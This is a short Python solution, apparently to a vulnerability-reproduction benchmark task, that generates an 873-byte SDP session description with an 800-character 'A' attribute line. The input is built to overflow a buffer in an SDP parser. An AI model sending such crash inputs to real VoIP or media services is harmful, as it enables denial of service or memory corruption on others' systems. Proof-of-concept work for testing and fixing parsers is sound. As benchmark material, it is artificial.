class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """v=0
o=- 0 0 IN IP4 127.0.0.1
s=-
c=IN IP4 127.0.0.1
t=0 0
m=audio 5004 RTP/AVP 0
a=rtpmap:0 PCMU/8000
"""
        long_value = "A" * 800
        poc += f"a={long_value}\n"
        poc_bytes = poc.encode('utf-8')
        # Adjust length to closer to 873 if needed, but this should be around
        return poc_bytes[:873] if len(poc_bytes) > 873 else poc_bytes + b"\x00" * (873 - len(poc_bytes))